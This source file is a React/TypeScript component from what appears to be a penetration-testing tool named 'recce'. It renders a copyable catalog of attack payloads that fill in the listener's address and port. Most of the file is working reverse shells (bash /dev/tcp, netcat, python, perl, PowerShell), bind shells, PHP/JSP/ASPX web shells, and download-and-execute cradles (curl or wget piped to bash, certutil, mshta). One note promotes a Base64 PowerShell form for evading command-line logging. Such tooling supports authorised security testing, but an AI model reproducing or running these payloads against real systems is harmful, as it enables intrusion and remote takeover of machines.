import { useEffect, useState } from "react";
import { getStager } from "./api";

// A curated reverse-shell payload catalog — "recce writes the payload for you". Templates
// are filled with the listener's LHOST + port so a tester never hand-assembles a one-liner
// or guesses which works on a given target. Grouped by platform because that's the real
// decision (bash /dev/tcp is Linux-only; Windows needs PowerShell, etc.).
type P = { label: string; tmpl: string; note?: string };
const CATALOG: { group: string; items: P[] }[] = [
  {
    group: "Linux / Unix",
    items: [
      { label: "bash", tmpl: "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1", note: "bash only (not dash/busybox)" },
      { label: "bash (fd)", tmpl: "0<&196;exec 196<>/dev/tcp/{LHOST}/{PORT};sh <&196 >&196 2>&196" },
      { label: "nc (mkfifo)", tmpl: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {PORT} >/tmp/f", note: "no -e needed" },
      { label: "nc -e", tmpl: "nc {LHOST} {PORT} -e /bin/sh" },
      { label: "python3", tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'" },
      { label: "socat (PTY)", tmpl: "socat TCP:{LHOST}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY — best quality" },
      { label: "perl", tmpl: "perl -e 'use Socket;$i=\"{LHOST}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
      { label: "ruby", tmpl: "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
      { label: "php", tmpl: "php -r '$s=fsockopen(\"{LHOST}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
      { label: "lua", tmpl: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3')\"", note: "needs luasocket" },
      { label: "awk", tmpl: "awk 'BEGIN {s=\"/inet/tcp/0/{LHOST}/{PORT}\";while(42){printf \"> \" |& s;s |& getline c;if(c){while((c |& getline line)>0)print line |& s;close(c)}}}'" },
      { label: "openssl", tmpl: "mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {LHOST}:{PORT}>/tmp/s;rm /tmp/s", note: "encrypted transport without TLS listener" },
      { label: "node", tmpl: "node -e '(function(){var n=require(\"net\"),c=require(\"child_process\"),s=n.connect({port:{PORT},host:\"{LHOST}\"},function(){c.exec(\"/bin/sh -i\",{stdio:[s,s,s]})});})();'" },
      { label: "java (Runtime)", tmpl: "Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1\"});", note: "for JSP/WAR deployments" },
      { label: "curl pipe", tmpl: "curl http://{LHOST}:{PORT}/shell.sh | bash", note: "host a script on your listener" },
      { label: "wget pipe", tmpl: "wget -qO- http://{LHOST}:{PORT}/shell.sh | bash" },
    ],
  },
  {
    group: "Windows",
    items: [
      { label: "PowerShell", tmpl: "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"", note: "no /dev/tcp on Windows" },
      { label: "PowerShell (Base64)", tmpl: "powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnAHsATABIAE8AUwBUAH0AJwAsAHsAUABPAFIAVAB9ACkA", note: "evades basic command-line logging — replace B64 with your encoded payload" },
      { label: "PS download cradle", tmpl: "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:{PORT}/shell.ps1')\"", note: "host your stager" },
      { label: "nc.exe", tmpl: "nc.exe {LHOST} {PORT} -e cmd.exe" },
      { label: "powercat", tmpl: "powercat -c {LHOST} -p {PORT} -e cmd.exe", note: "needs powercat loaded" },
      { label: "certutil + nc", tmpl: "certutil -urlcache -split -f http://{LHOST}:{PORT}/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe {LHOST} {PORT} -e cmd.exe", note: "LOLBin file transfer" },
      { label: "mshta", tmpl: "mshta http://{LHOST}:{PORT}/shell.hta", note: "LOLBin — host an HTA with embedded script" },
      { label: "conpty", tmpl: "IEX(IWR http://{LHOST}:{PORT}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {LHOST} {PORT}", note: "full interactive PTY on Windows" },
    ],
  },
  {
    group: "macOS",
    items: [
      { label: "python3", tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/zsh\",\"-i\"])'", note: "default shell is zsh" },
      { label: "bash", tmpl: "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1", note: "if bash present" },
    ],
  },
  {
    group: "Web Shells",
    items: [
      { label: "PHP webshell", tmpl: "<?php system($_GET['cmd']); ?>", note: "upload to web root, access via ?cmd=whoami" },
      { label: "PHP reverse", tmpl: "<?php $s=fsockopen(\"{LHOST}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>", note: "upload and trigger via HTTP" },
      { label: "JSP webshell", tmpl: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", note: "Tomcat / JBoss" },
      { label: "ASPX webshell", tmpl: "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>", note: "IIS / .NET" },
    ],
  },
  {
    group: "Bind Shells",
    items: [
      { label: "nc bind", tmpl: "nc -lvp {PORT} -e /bin/sh", note: "target listens, you connect" },
      { label: "python bind", tmpl: "python3 -c 'import socket,os;s=socket.socket();s.bind((\"0.0.0.0\",{PORT}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(\"/bin/sh -i\")'", note: "target listens on {PORT}" },
      { label: "socat bind", tmpl: "socat TCP-LISTEN:{PORT},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid", note: "full PTY bind" },
      { label: "PowerShell bind", tmpl: "powershell -c \"$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{PORT});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$l.Stop()\"", note: "target listens on {PORT}" },
    ],
  },
  {
    group: "File Transfer",
    items: [
      { label: "python HTTP server", tmpl: "python3 -m http.server {PORT}", note: "serve files from current directory" },
      { label: "certutil download", tmpl: "certutil -urlcache -split -f http://{LHOST}:{PORT}/file.exe C:\\Windows\\Temp\\file.exe", note: "Windows LOLBin" },
      { label: "PS download", tmpl: "(New-Object Net.WebClient).DownloadFile(\"http://{LHOST}:{PORT}/file.exe\",\"C:\\Windows\\Temp\\file.exe\")", note: "IWR alternative" },
      { label: "curl download", tmpl: "curl -o /tmp/file http://{LHOST}:{PORT}/file" },
      { label: "scp", tmpl: "scp user@{LHOST}:/path/to/file /tmp/file", note: "needs SSH access to attacker" },
    ],
  },
];

// The robust shell: a reconnecting-PTY stager. Unlike the raw one-liners below, this gives
// a real PTY (full interactivity from byte one — no stabilize dance), announces a session
// token so it rebinds to the SAME recce session, and auto-reconnects on drop. A script, not
// a compiled implant — plain transport, no toolchain.
// The robust reconnecting-PTY stager is served by the backend (single source of truth,
// see /api/stager) and fetched below — no hardcoded copy to drift out of sync.

// raw one-liners for a TLS listener (plaintext ones won't complete the TLS handshake)
const TLS_CATALOG: { group: string; items: P[] }[] = [
  {
    group: "Linux / Unix (TLS)",
    items: [
      { label: "ncat --ssl", tmpl: "ncat --ssl {LHOST} {PORT} -e /bin/bash", note: "if ncat present" },
      { label: "socat (TLS)", tmpl: "socat OPENSSL:{LHOST}:{PORT},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY, encrypted" },
      { label: "openssl", tmpl: "mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect {LHOST}:{PORT}>/tmp/s;rm /tmp/s" },
      { label: "python3 (TLS)", tmpl: "python3 -c 'import socket,ssl,subprocess,os;s=socket.socket();s=ssl.wrap_socket(s);s.connect((\"{LHOST}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", note: "stdlib ssl — no deps" },
    ],
  },
];

const genToken = () => {
  const a = new Uint8Array(8);
  crypto.getRandomValues(a);
  return "t" + Array.from(a, (b) => b.toString(16).padStart(2, "0")).join("");
};

function CopyLine({ text }: { text: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button className="payload-copy" title="copy" onClick={() => {
      navigator.clipboard?.writeText(text).then(() => { setOk(true); setTimeout(() => setOk(false), 1000); });
    }}>{ok ? "✓" : "copy"}</button>
  );
}

export function PayloadCatalog({ port, tls = false }: { port: number; tls?: boolean }) {
  const [lhost, setLhost] = useState(location.hostname);
  const [token] = useState(genToken);
  const [stager, setStager] = useState<string>("");
  useEffect(() => { getStager(tls).then(setStager).catch(() => setStager("")); }, [tls]);
  const fill = (t: string) =>
    t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port)).split("{TOKEN}").join(token);
  const catalog = tls ? TLS_CATALOG : CATALOG;
  return (
    <div className="payload-catalog">
      <label className="payload-lhost">
        LHOST <input className="scan-in" value={lhost} onChange={(e) => setLhost(e.target.value)}
                     title="the address the target should call back to" />
        {tls && <span className="muted small">🔒 encrypted listener — use these TLS payloads</span>}
      </label>

      <div className="payload-group">
        <div className="payload-group-h robust">★ Robust · auto-reconnect PTY{tls ? " · TLS" : ""} (recommended)</div>
        <div className="payload-item robust-item">
          <span className="payload-label">python</span>
          <code className="payload-code">{stager ? fill(stager) : "loading…"}</code>
          <span className="payload-note muted small">full PTY + resize, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
          {stager && <CopyLine text={fill(stager)} />}
        </div>
      </div>

      {catalog.map((g) => (
        <div key={g.group} className="payload-group">
          <div className="payload-group-h">{g.group}</div>
          {g.items.map((p) => (
            <div key={p.label} className="payload-item">
              <span className="payload-label">{p.label}</span>
              <code className="payload-code">{fill(p.tmpl)}</code>
              {p.note && <span className="payload-note muted small">{p.note}</span>}
              <CopyLine text={fill(p.tmpl)} />
            </div>
          ))}
        </div>
      ))}
    </div>
  );
}
